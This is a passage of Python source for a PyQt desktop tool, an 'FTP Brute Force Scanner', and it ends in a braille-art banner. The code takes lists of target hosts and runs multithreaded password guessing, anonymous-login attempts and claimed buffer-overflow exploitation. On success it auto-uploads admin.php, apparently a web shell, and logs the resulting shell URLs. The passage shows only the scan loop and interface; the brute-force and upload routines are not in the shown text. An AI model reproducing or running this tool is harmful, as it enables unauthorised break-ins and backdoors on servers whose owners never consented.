    
    def __init__(self, targets, max_workers):
        super().__init__()
        self.targets = targets
        self.max_workers = max_workers
        self._is_running = True
        
    def stop(self):
        self._is_running = False
        
    def run(self):
        try:
            # Nettoyer les cibles
            cleaned_targets = clean_targets_list(self.targets)
            
            if not cleaned_targets:
                self.result_signal.emit("❌ No valid targets found after cleaning!")
                return
            
            total = len(cleaned_targets)
            global_stats['total'] = total
            global_stats['start_time'] = time.time()
            global_stats['checked'] = 0
            global_stats['active_ftp'] = 0
            global_stats['success'] = 0
            global_stats['failed'] = 0
            global_stats['anonymous_access'] = 0
            global_stats['uploads_success'] = 0
            global_stats['uploads_failed'] = 0
            global_stats['subdomains_found'] = 0
            global_stats['buffer_overflow_vulns'] = 0
            global_stats['buffer_overflow_exploited'] = 0
            global_stats['shells_saved'] = 0
            
            self.result_signal.emit(f"🚀 Starting FTP scan on {total} targets with {self.max_workers} threads...")
            self.result_signal.emit(f"📋 Strategies: Subdomain discovery → Buffer Overflow → Anonymous → High probability → Smart generation")
            self.result_signal.emit(f"🔥 AUTO-UPLOAD: admin.php will be uploaded after successful login!")
            self.result_signal.emit(f"💾 SHELL SAVING: Shell URLs will be saved to {SHELLS_FILE}!")
            self.result_signal.emit(f"🌐 SUBDOMAIN DISCOVERY: Auto-discovery of FTP subdomains enabled!")
            self.result_signal.emit(f"💥 BUFFER OVERFLOW: Detection and exploitation enabled!")
            self.result_signal.emit("=" * 60)
            
            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                futures = {}
                for i, target in enumerate(cleaned_targets):
                    if not self._is_running:
                        break
                    if target.strip():
                        future = executor.submit(self.scan_single_ftp, target.strip())
                        futures[future] = target
                
                completed = 0
                for future in as_completed(futures):
                    if not self._is_running:
                        break
                    
                    target = futures[future]
                    try:
                        result = future.result()
                        completed += 1
                        self.progress_signal.emit(completed, total, f"Scanned: {target}")
                        
                        stats_text = (f"Total: {global_stats['total']} | "
                                    f"Active: {global_stats['active_ftp']} | "
                                    f"Success: {global_stats['success']} | "
                                    f"Anonymous: {global_stats['anonymous_access']} | "
                                    f"Subdomains: {global_stats['subdomains_found']} | "
                                    f"BufferOverflow: {global_stats['buffer_overflow_vulns']}/{global_stats['buffer_overflow_exploited']} | "
                                    f"Failed: {global_stats['failed']} | "
                                    f"Uploads: {global_stats['uploads_success']}/{global_stats['uploads_failed']} | "
                                    f"Shells: {global_stats['shells_saved']}")
                        self.stats_signal.emit(stats_text)
                        
                    except Exception as e:
                        completed += 1
                        self.result_signal.emit(f"❌ ERROR: {target} - {str(e)}")
                    
                    if completed % 5 == 0:
                        elapsed = time.time() - global_stats['start_time']
                        rate = completed / elapsed if elapsed > 0 else 0
                        self.result_signal.emit(f"📈 PROGRESS: {completed}/{total} | Rate: {rate:.1f}/s | Success: {global_stats['success']} | Subdomains: {global_stats['subdomains_found']} | BufferOverflow: {global_stats['buffer_overflow_vulns']} | Uploads: {global_stats['uploads_success']} | Shells: {global_stats['shells_saved']}")
            
            self.result_signal.emit("=" * 60)
            self.result_signal.emit("✅ FTP scan completed!")
            self.result_signal.emit(f"💾 Results saved to: {RESULTS_FILE}")
            self.result_signal.emit(f"💾 Active FTP list: {ACTIVE_FTP_FILE}")
            self.result_signal.emit(f"💾 Upload logs: {UPLOAD_LOG_FILE}")
            self.result_signal.emit(f"💾 Subdomains: {SUBDOMAINS_FILE}")
            self.result_signal.emit(f"💾 Buffer Overflow: {BUFFER_OVERFLOW_FILE}")
            self.result_signal.emit(f"💾 Shell URLs: {SHELLS_FILE}")
            
            elapsed = time.time() - global_stats['start_time']
            success_rate = (global_stats['success'] / total * 100) if total > 0 else 0
            upload_success_rate = (global_stats['uploads_success'] / global_stats['success'] * 100) if global_stats['success'] > 0 else 0
            
            self.result_signal.emit(f"📊 FINAL: {global_stats['success']}/{total} successful ({success_rate:.1f}%) in {elapsed:.1f}s")
            self.result_signal.emit(f"🌐 SUBDOMAINS: {global_stats['subdomains_found']} FTP subdomains discovered")
            self.result_signal.emit(f"💥 BUFFER OVERFLOW: {global_stats['buffer_overflow_vulns']} vulnerable, {global_stats['buffer_overflow_exploited']} exploited")
            self.result_signal.emit(f"📤 UPLOADS: {global_stats['uploads_success']} successful uploads ({upload_success_rate:.1f}% of successes)")
            self.result_signal.emit(f"🐚 SHELLS: {global_stats['shells_saved']} shell URLs saved to {SHELLS_FILE}")
            
        except Exception as e:
            self.result_signal.emit(f"💥 Scan error: {str(e)}")
    
    def scan_single_ftp(self, target):
        """Scan single FTP target"""
        return bruteforce_ftp_target(target)

class MainWindow(QMainWindow):
    """Main GUI Window avec nouvelles fonctionnalités"""
    def __init__(self):
        super().__init__()
        self.init_ui()
        
    def init_ui(self):
        self.setWindowTitle("FTP Brute Force Scanner - Ultimate Power v4.0 [SUBDOMAINS+BUFFER-OVERFLOW+SHELL-SAVE]")
        self.setGeometry(100, 100, 1200, 800)
        
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        
        tabs = QTabWidget()
        main_layout.addWidget(tabs)
        
        scanner_tab = QWidget()
        scanner_layout = QVBoxLayout(scanner_tab)
        
        input_layout = QHBoxLayout()
        self.targets_input = QTextEdit()
        self.targets_input.setPlaceholderText("Enter FTP targets (one per line)\nFormat: hostname or hostname:port\nExample: ftp.example.com or 192.168.1.1:2121\n\n🔥 NEW: Auto-subdomain discovery & Buffer Overflow detection & Shell saving!\n\n⚠️ URLs like http://example.com will be automatically cleaned!")
        self.targets_input.setMinimumHeight(200)
        input_layout.addWidget(self.targets_input)
        
        button_layout = QVBoxLayout()
        self.load_btn = QPushButton("📁 Load Targets")
        self.start_btn = QPushButton("🚀 Start Advanced FTP Scan")
        self.stop_btn = QPushButton("⏹️ Stop Scan")
        self.stats_btn = QPushButton("📊 Show Stats")
        self.view_shells_btn = QPushButton("🐚 View Shells")
        
        for btn in [self.load_btn, self.start_btn, self.stop_btn, self.stats_btn, self.view_shells_btn]:
            btn.setMinimumHeight(40)
            if btn == self.start_btn:
                btn.setStyleSheet("QPushButton { background-color: #e74c3c; color: white; font-weight: bold; font-size: 12px; }")
            elif btn == self.stop_btn:
                btn.setStyleSheet("QPushButton { background-color: #e74c3c; color: white; }")
            elif btn == self.view_shells_btn:
                btn.setStyleSheet("QPushButton { background-color: #9b59b6; color: white; font-weight: bold; }")
            else:
                btn.setStyleSheet("QPushButton { background-color: #3498db; color: white; }")
        
        button_layout.addWidget(self.load_btn)
        button_layout.addWidget(self.start_btn)
        button_layout.addWidget(self.stop_btn)
        button_layout.addWidget(self.stats_btn)
        button_layout.addWidget(self.view_shells_btn)
        button_layout.addStretch()
        
        input_layout.addLayout(button_layout)
        scanner_layout.addLayout(input_layout)
        
        progress_layout = QHBoxLayout()
        self.progress_bar = QProgressBar()
        self.progress_bar.setStyleSheet("QProgressBar { border: 2px solid grey; border-radius: 5px; text-align: center; } QProgressBar::chunk { background-color: #05B8CC; width: 20px; }")
        self.progress_label = QLabel("Ready to scan...")
        self.progress_label.setStyleSheet("QLabel { color: #2ecc71; font-weight: bold; }")
        progress_layout.addWidget(self.progress_bar)
        progress_layout.addWidget(self.progress_label)
        scanner_layout.addLayout(progress_layout)
        
        stats_layout = QHBoxLayout()
        self.stats_label = QLabel("Total: 0 | Active: 0 | Success: 0 | Subdomains: 0 | BufferOverflow: 0/0 | Uploads: 0/0 | Shells: 0")
        self.stats_label.setStyleSheet("QLabel { color: #f39c12; font-weight: bold; background-color: #2c3e50; padding: 5px; border-radius: 3px; }")
        stats_layout.addWidget(self.stats_label)
        scanner_layout.addLayout(stats_layout)
        
        self.results_output = QTextEdit()
        self.results_output.setReadOnly(True)
        self.results_output.setStyleSheet("QTextEdit { background-color: #1a1a1a; color: #00ff00; font-family: 'Courier New'; }")
        scanner_layout.addWidget(self.results_output)
        
        tabs.addTab(scanner_tab, "🔍 Advanced FTP Scanner")
        
        settings_tab = QWidget()
        settings_layout = QVBoxLayout(settings_tab)
        
        thread_layout = QHBoxLayout()
        thread_layout.addWidget(QLabel("🧵 Threads:"))
        self.threads_spin = QSpinBox()
        self.threads_spin.setRange(1, 50)
        self.threads_spin.setValue(MAX_WORKERS)
        self.threads_spin.setStyleSheet("QSpinBox { padding: 5px; }")
        thread_layout.addWidget(self.threads_spin)
        thread_layout.addStretch()
        settings_layout.addLayout(thread_layout)
        
        strategy_group = QFrame()
        strategy_group.setFrameStyle(QFrame.Box)
        strategy_layout = QVBoxLayout(strategy_group)
        strategy_layout.addWidget(QLabel("🎯 Advanced Scanning Strategies:"))
        
        self.chk_anonymous = QCheckBox("Test Anonymous Access First")
        self.chk_anonymous.setChecked(True)
        self.chk_high_prob = QCheckBox("High Probability Combinations")
        self.chk_high_prob.setChecked(True)
        self.chk_smart_gen = QCheckBox("Smart Password Generation (300+ passwords)")
        self.chk_smart_gen.setChecked(True)
        self.chk_domain_based = QCheckBox("Domain-based Credentials")
        self.chk_domain_based.setChecked(True)
        self.chk_auto_upload = QCheckBox("🔥 Auto-upload admin.php after success")
        self.chk_auto_upload.setChecked(True)
        self.chk_shell_save = QCheckBox("💾 Auto-save shell URLs to shell.txt")
        self.chk_shell_save.setChecked(True)
        self.chk_shell_save.setStyleSheet("QCheckBox { color: #9b59b6; font-weight: bold; }")
        self.chk_subdomain_discovery = QCheckBox("🌐 Auto-discover FTP subdomains")
        self.chk_subdomain_discovery.setChecked(True)
        self.chk_subdomain_discovery.setStyleSheet("QCheckBox { color: #3498db; font-weight: bold; }")
        self.chk_buffer_overflow = QCheckBox("💥 Buffer Overflow vulnerability detection")
        self.chk_buffer_overflow.setChecked(True)
        self.chk_buffer_overflow.setStyleSheet("QCheckBox { color: #e74c3c; font-weight: bold; }")
        
        for chk in [self.chk_anonymous, self.chk_high_prob, self.chk_smart_gen, 
                   self.chk_domain_based, self.chk_auto_upload, self.chk_shell_save,
                   self.chk_subdomain_discovery, self.chk_buffer_overflow]:
            strategy_layout.addWidget(chk)
        
        settings_layout.addWidget(strategy_group)
        settings_layout.addStretch()
        
        tabs.addTab(settings_tab, "⚙️ Advanced Settings")
        
        self.load_btn.clicked.connect(self.load_targets)
        self.start_btn.clicked.connect(self.start_scan)
        self.stop_btn.clicked.connect(self.stop_scan)
        self.stats_btn.clicked.connect(self.show_stats)
        self.view_shells_btn.clicked.connect(self.view_shells)

    def load_targets(self):
        filename, _ = QFileDialog.getOpenFileName(self, "Load FTP Targets", "", "Text Files (*.txt);;All Files (*)")
        if filename:
            try:
                with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                    targets = f.read()
                    self.targets_input.setPlainText(targets)
                self.results_output.append(f"✅ Loaded targets from: {filename}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to load file: {str(e)}")

    def start_scan(self):
        targets = self.targets_input.toPlainText().strip().split('\n')
        targets = [t.strip() for t in targets if t.strip()]
        
        if not targets:
            QMessageBox.warning(self, "Warning", "No FTP targets specified!")
            return
        
        self.scan_thread = FTPScanThread(targets, self.threads_spin.value())
        self.scan_thread.progress_signal.connect(self.update_progress)
        self.scan_thread.result_signal.connect(self.update_results)
        self.scan_thread.stats_signal.connect(self.update_stats)
        self.scan_thread.start()
        
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        
    def stop_scan(self):
        if hasattr(self, 'scan_thread'):
            self.scan_thread.stop()
            self.start_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)
            
    def show_stats(self):
        stats_text = (f"📊 Current Statistics:\n"
                     f"Total Targets: {global_stats['total']}\n"
                     f"Active FTP: {global_stats['active_ftp']}\n"
                     f"Successful: {global_stats['success']}\n"
                     f"Anonymous: {global_stats['anonymous_access']}\n"
                     f"Subdomains Found: {global_stats['subdomains_found']}\n"
                     f"Buffer Overflow Vulnerable: {global_stats['buffer_overflow_vulns']}\n"
                     f"Buffer Overflow Exploited: {global_stats['buffer_overflow_exploited']}\n"
                     f"Failed: {global_stats['failed']}\n"
                     f"Uploads Success: {global_stats['uploads_success']}\n"
                     f"Uploads Failed: {global_stats['uploads_failed']}\n"
                     f"Shells Saved: {global_stats['shells_saved']}")
        QMessageBox.information(self, "Scan Statistics", stats_text)

    def view_shells(self):
        """Afficher les shells sauvegardés"""
        try:
            if os.path.exists(SHELLS_FILE):
                with open(SHELLS_FILE, 'r', encoding='utf-8') as f:
                    shells = f.read().strip()
                
                if shells:
                    shell_dialog = QMessageBox(self)
                    shell_dialog.setWindowTitle("Saved Shells")
                    shell_dialog.setText(f"Shell URLs saved in {SHELLS_FILE}:\n\n{shells}")
                    shell_dialog.setDetailedText(shells)
                    shell_dialog.exec_()
                else:
                    QMessageBox.information(self, "Shells", "No shells saved yet.")
            else:
                QMessageBox.information(self, "Shells", "No shells file found yet.")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to read shells file: {str(e)}")
            
    def update_progress(self, current, total, message):
        self.progress_bar.setMaximum(total)
        self.progress_bar.setValue(current)
        self.progress_label.setText(message)
        
    def update_results(self, result):
        self.results_output.append(result)
        cursor = self.results_output.textCursor()
        cursor.movePosition(QTextCursor.End)
        self.results_output.setTextCursor(cursor)
        
    def update_stats(self, stats_text):
        self.stats_label.setText(stats_text)

def print_banner():
    banner = f"""{Colors.MAGENTA}
                                                                                          
⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⡟⠀⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⢘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⡇⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⡇⣿⠰⡀⠈⠄⠀⠀⠀⠀⠀⠀⠀⢳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣇⢻⡇⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠾⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣄⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠠⠀⠀⠀⠀⠀⠀⠡⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⣄⠀⠀⠀⠀⠀⠘⠆⠀⠈⢿⣦⠀⠀⠠⠀⠀⠀⠀⠀⢰⣶⣶⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⡶⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡄⠀⠀⠀⠀⠀⠀⠘⣦⣀⠀⠀⠀⢠⣀⠀⠀⠈⠳⠦⠀⠀⠀⠀⠀⠀⠐⠀⢻⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⡿⠃⠜⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣇⠀⠀⠀⣷⣄⠀⠀⠈⠛⢷⣶⣤⡄⠙⠳⠦⣤⡀⠈⠀⠀⠀⡀⠸⣤⣄⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⠟⢠⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠈⠻⠷⠆⢰⣿⣿⣷⣤⡀⠈⠻⣿⣿⣿⣦⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠠⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⡿⢃⣴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢶⣶⣄⠄⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⠉⠀⢀⣠⣴⣶⣶⣶⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠋⣰⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣦⡀⢀⣾⣄⠠⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀
⣡⣿⣿⠃⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⢰⡿⢋⣴⣿⣿⣿⣿⣦⣤⡹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡁⠀⠈⠉⠛⠛⠿⣿⣷⣀⡐⠠⠷⣼⠂⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣉⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⡛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣴⣆⣠⡀⠀⠀⠉⠛⠛⠛⠋⠉⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⠀
⣿⡡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⢌⡛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣦⣄⣀⣀⡠⠀⡤⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡻⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⢀⣤⣄⣠⣴⠟⢁⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡛⢿⣿⣿⣿⣴⣿⣿⣿⠟⣁⠔⣫⣴⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡠⠀⠀⡐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡉⢿⡿⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣀⡂⠉⢛⠻⠿⢋⠥⢊⣡⣾⣿⣷⡄⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡔⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣆⣻⣿⣷⣬⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣌⣒⠂⠭⠍⠛⠻⢿⠃⠀⣸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⡜⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⣴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠘⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡾⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣦⣌⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣶⣄⡙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢠⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
